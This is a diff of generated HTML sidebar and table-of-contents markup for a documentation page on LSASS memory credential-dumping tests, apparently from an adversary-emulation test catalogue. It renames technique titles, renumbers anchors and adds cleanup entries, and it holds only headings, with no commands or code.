    </li>
    <li class="toctree-l2">
@@ -3790,17 +3790,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1021.001.html">
-     T1021.001 - Remote Services: Remote Desktop Protocol
+     T1021.001 - Remote Desktop Protocol
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1021.002.html">
-     T1021.002 - Remote Services: SMB/Windows Admin Shares
+     T1021.002 - SMB/Windows Admin Shares
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1021.003.html">
-     T1021.003 - Remote Services: Distributed Component Object Model
+     T1021.003 - Distributed Component Object Model
     </a>
    </li>
    <li class="toctree-l2">
@@ -3815,7 +3815,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1021.006.html">
-     T1021.006 - Remote Services: Windows Remote Management
+     T1021.006 - Windows Remote Management
     </a>
    </li>
    <li class="toctree-l2">
@@ -3905,12 +3905,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1550.002.html">
-     T1550.002 - Use Alternate Authentication Material: Pass the Hash
+     T1550.002 - Pass the Hash
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1550.003.html">
-     T1550.003 - Use Alternate Authentication Material: Pass the Ticket
+     T1550.003 - Pass the Ticket
     </a>
    </li>
    <li class="toctree-l2">
@@ -3930,7 +3930,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../lateral-movement/T1563.002.html">
-     T1563.002 - Remote Service Session Hijacking: RDP Hijacking
+     T1563.002 - RDP Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -3972,12 +3972,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1056.001.html">
-     T1056.001 - Input Capture: Keylogging
+     T1056.001 - Keylogging
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1056.002.html">
-     T1056.002 - Input Capture: GUI Input Capture
+     T1056.002 - GUI Input Capture
     </a>
    </li>
    <li class="toctree-l2">
@@ -3987,7 +3987,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1056.004.html">
-     T1056.004 - Input Capture: Credential API Hooking
+     T1056.004 - Credential API Hooking
     </a>
    </li>
    <li class="toctree-l2">
@@ -3997,7 +3997,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1074.001.html">
-     T1074.001 - Data Staged: Local Data Staging
+     T1074.001 - Local Data Staging
     </a>
    </li>
    <li class="toctree-l2">
@@ -4017,7 +4017,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1114.001.html">
-     T1114.001 - Email Collection: Local Email Collection
+     T1114.001 - Local Email Collection
     </a>
    </li>
    <li class="toctree-l2">
@@ -4027,7 +4027,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1114.003.html">
-     T1114.003 - Email Collection: Email Forwarding Rule
+     T1114.003 - Email Forwarding Rule
     </a>
    </li>
    <li class="toctree-l2">
@@ -4082,12 +4082,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1530.html">
-     T1530 - Data from Cloud Storage Object
+     T1530 - Data from Cloud Storage
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1557.001.html">
-     T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+     T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
     </a>
    </li>
    <li class="toctree-l2">
@@ -4107,12 +4107,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1560.001.html">
-     T1560.001 - Archive Collected Data: Archive via Utility
+     T1560.001 - Archive via Utility
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../collection/T1560.002.html">
-     T1560.002 - Archive Collected Data: Archive via Library
+     T1560.002 - Archive via Library
     </a>
    </li>
    <li class="toctree-l2">
@@ -4204,7 +4204,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../command-and-control/T1071.001.html">
-     T1071.001 - Application Layer Protocol: Web Protocols
+     T1071.001 - Web Protocols
     </a>
    </li>
    <li class="toctree-l2">
@@ -4219,7 +4219,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../command-and-control/T1071.004.html">
-     T1071.004 - Application Layer Protocol: DNS
+     T1071.004 - DNS
     </a>
    </li>
    <li class="toctree-l2">
@@ -4234,7 +4234,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../command-and-control/T1090.001.html">
-     T1090.001 - Proxy: Internal Proxy
+     T1090.001 - Internal Proxy
     </a>
    </li>
    <li class="toctree-l2">
@@ -4244,7 +4244,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../command-and-control/T1090.003.html">
-     T1090.003 - Proxy: Multi-hop Proxy
+     T1090.003 - Multi-hop Proxy
     </a>
    </li>
    <li class="toctree-l2">
@@ -4304,7 +4304,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../command-and-control/T1132.001.html">
-     T1132.001 - Data Encoding: Standard Encoding
+     T1132.001 - Standard Encoding
     </a>
    </li>
    <li class="toctree-l2">
@@ -4461,12 +4461,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../exfiltration/T1048.002.html">
-     T1048.002 - Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+     T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../exfiltration/T1048.003.html">
-     T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+     T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
     </a>
    </li>
    <li class="toctree-l2">
@@ -4496,7 +4496,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../exfiltration/T1567.002.html">
-     T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
+     T1567.002 - Exfiltration to Cloud Storage
     </a>
    </li>
    <li class="toctree-l2">
@@ -4548,7 +4548,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../impact/T1491.001.html">
-     T1491.001 - Defacement: Internal Defacement
+     T1491.001 - Internal Defacement
     </a>
    </li>
    <li class="toctree-l2">
@@ -4882,21 +4882,21 @@ title="Print to PDF"
        </code>
       </a>
      </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#cleanup">
+       Cleanup:
+      </a>
+     </li>
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dll">
-     Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dll
+    <a class="reference internal nav-link" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dllthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-a-built-in-dll">
+     Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dllThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id1">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -4907,7 +4907,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id1">
+      <a class="reference internal nav-link" href="#id2">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -4923,25 +4923,30 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id2">
+        <a class="reference internal nav-link" href="#id3">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id3">
+        <a class="reference internal nav-link" href="#id4">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id4">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
          command_prompt
         </span>
        </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id6">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -4952,7 +4957,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id5">
+      <a class="reference internal nav-link" href="#id7">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -4968,19 +4973,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id6">
+        <a class="reference internal nav-link" href="#id8">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id7">
+        <a class="reference internal nav-link" href="#id9">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id8">
+      <a class="reference internal nav-link" href="#id10">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -4989,11 +4994,16 @@ title="Print to PDF"
        </code>
       </a>
      </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id11">
+       Cleanup:
+      </a>
+     </li>
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-manager">
-     Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager
+    <a class="reference internal nav-link" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-managerthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-the-windows-task">
+     Atomic Test #5 - Dump LSASS.exe Memory using Windows Task ManagerThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     </a>
    </li>
    <li class="toc-h3 nav-item toc-entry">
@@ -5002,7 +5012,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id9">
+      <a class="reference internal nav-link" href="#id12">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5018,12 +5028,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id10">
+        <a class="reference internal nav-link" href="#id13">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id11">
+        <a class="reference internal nav-link" href="#id14">
          Get Prereq Commands:
         </a>
        </li>
@@ -5033,19 +5043,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id12">
+        <a class="reference internal nav-link" href="#id15">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id13">
+        <a class="reference internal nav-link" href="#id16">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id14">
+      <a class="reference internal nav-link" href="#id17">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5078,12 +5088,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id15">
+        <a class="reference internal nav-link" href="#id18">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id16">
+        <a class="reference internal nav-link" href="#id19">
          Get Prereq Commands:
         </a>
        </li>
@@ -5093,12 +5103,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id17">
+        <a class="reference internal nav-link" href="#id20">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id18">
+        <a class="reference internal nav-link" href="#id21">
          Get Prereq Commands:
         </a>
        </li>
@@ -5108,19 +5118,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id19">
+        <a class="reference internal nav-link" href="#id22">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id20">
+        <a class="reference internal nav-link" href="#id23">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id21">
+      <a class="reference internal nav-link" href="#id24">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5132,18 +5142,13 @@ title="Print to PDF"
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1">
-     Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1
+    <a class="reference internal nav-link" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1the-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-test-leverages-a-pure">
+     Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id22">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id25">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -5154,7 +5159,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id23">
+      <a class="reference internal nav-link" href="#id26">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5165,24 +5170,24 @@ title="Print to PDF"
       </a>
       <ul class="nav section-nav flex-column">
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id24">
+        <a class="reference internal nav-link" href="#id27">
          Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id25">
+        <a class="reference internal nav-link" href="#id28">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id26">
+        <a class="reference internal nav-link" href="#id29">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id27">
+      <a class="reference internal nav-link" href="#id30">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5191,24 +5196,17 @@ title="Print to PDF"
        </code>
       </a>
      </li>
-    </ul>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-10-powershell-mimikatz">
-     Atomic Test #10 - Powershell Mimikatz
-    </a>
-    <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id28">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id31">
+       Cleanup:
       </a>
      </li>
     </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-10-powershell-mimikatzdumps-credentials-from-memory-via-powershell-by-invoking-a-remote-mimikatz-script">
+     Atomic Test #10 - Powershell MimikatzDumps credentials from memory via Powershell by invoking a remote mimikatz script.
+    </a>
    </li>
    <li class="toc-h3 nav-item toc-entry">
     <a class="reference internal nav-link" href="#atomic-test-11-dump-lsass-with-createdump-exe-from-net-v5">
@@ -5216,7 +5214,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id29">
+      <a class="reference internal nav-link" href="#id32">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5232,51 +5230,6 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id30">
-         Check Prereq Commands:
-        </a>
-       </li>
-       <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id31">
-         Get Prereq Commands:
-        </a>
-       </li>
-      </ul>
-     </li>
-     <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id32">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
-      </a>
-     </li>
-    </ul>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls">
-     Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs
-    </a>
-    <ul class="nav section-nav flex-column">
-     <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#dependencies-run-with-none">
-       Dependencies:  Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         None
-        </span>
-       </code>
-       !
-      </a>
-      <ul class="nav section-nav flex-column">
-       <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#description-computer-must-have-xordump-exe">
-         Description: Computer must have xordump.exe
-        </a>
-       </li>
-       <li class="toc-h5 nav-item toc-entry">
         <a class="reference internal nav-link" href="#id33">
          Check Prereq Commands:
         </a>
@@ -5289,13 +5242,68 @@ title="Print to PDF"
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id35">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
          powershell
         </span>
        </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id35">
+       Cleanup:
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls">
+     Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id36">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-computer-must-have-xordump-exe">
+         Description: Computer must have xordump.exe
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id37">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id38">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id39">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id40">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -5316,7 +5324,7 @@ title="Print to PDF"
         <div class="col pl-md-3 pl-lg-5 content-container">
             <!-- Table of contents that is only displayed when printing the page -->
             <div id="jb-print-docs-body" class="onlyprint">
-                <h1>T1003.001 - OS Credential Dumping: LSASS Memory</h1>
+                <h1>T1003.001 - LSASS Memory</h1>
                 <!-- Table of contents -->
                 <div id="print-main-content">
                     <div id="jb-print-toc">
@@ -5374,21 +5382,21 @@ title="Print to PDF"
        </code>
       </a>
      </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#cleanup">
+       Cleanup:
+      </a>
+     </li>
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dll">
-     Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dll
+    <a class="reference internal nav-link" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dllthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-a-built-in-dll">
+     Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dllThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id1">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -5399,7 +5407,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id1">
+      <a class="reference internal nav-link" href="#id2">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5415,25 +5423,30 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id2">
+        <a class="reference internal nav-link" href="#id3">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id3">
+        <a class="reference internal nav-link" href="#id4">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id4">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
          command_prompt
         </span>
        </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id6">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -5444,7 +5457,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id5">
+      <a class="reference internal nav-link" href="#id7">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5460,19 +5473,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id6">
+        <a class="reference internal nav-link" href="#id8">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id7">
+        <a class="reference internal nav-link" href="#id9">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id8">
+      <a class="reference internal nav-link" href="#id10">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5481,11 +5494,16 @@ title="Print to PDF"
        </code>
       </a>
      </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id11">
+       Cleanup:
+      </a>
+     </li>
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-manager">
-     Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager
+    <a class="reference internal nav-link" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-managerthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-the-windows-task">
+     Atomic Test #5 - Dump LSASS.exe Memory using Windows Task ManagerThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     </a>
    </li>
    <li class="toc-h3 nav-item toc-entry">
@@ -5494,7 +5512,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id9">
+      <a class="reference internal nav-link" href="#id12">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5510,12 +5528,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id10">
+        <a class="reference internal nav-link" href="#id13">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id11">
+        <a class="reference internal nav-link" href="#id14">
          Get Prereq Commands:
         </a>
        </li>
@@ -5525,19 +5543,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id12">
+        <a class="reference internal nav-link" href="#id15">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id13">
+        <a class="reference internal nav-link" href="#id16">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id14">
+      <a class="reference internal nav-link" href="#id17">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5570,12 +5588,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id15">
+        <a class="reference internal nav-link" href="#id18">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id16">
+        <a class="reference internal nav-link" href="#id19">
          Get Prereq Commands:
         </a>
        </li>
@@ -5585,12 +5603,12 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id17">
+        <a class="reference internal nav-link" href="#id20">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id18">
+        <a class="reference internal nav-link" href="#id21">
          Get Prereq Commands:
         </a>
        </li>
@@ -5600,19 +5618,19 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id19">
+        <a class="reference internal nav-link" href="#id22">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id20">
+        <a class="reference internal nav-link" href="#id23">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id21">
+      <a class="reference internal nav-link" href="#id24">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5624,18 +5642,13 @@ title="Print to PDF"
     </ul>
    </li>
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1">
-     Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1
+    <a class="reference internal nav-link" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1the-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-test-leverages-a-pure">
+     Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id22">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id25">
+       Cleanup:
       </a>
      </li>
     </ul>
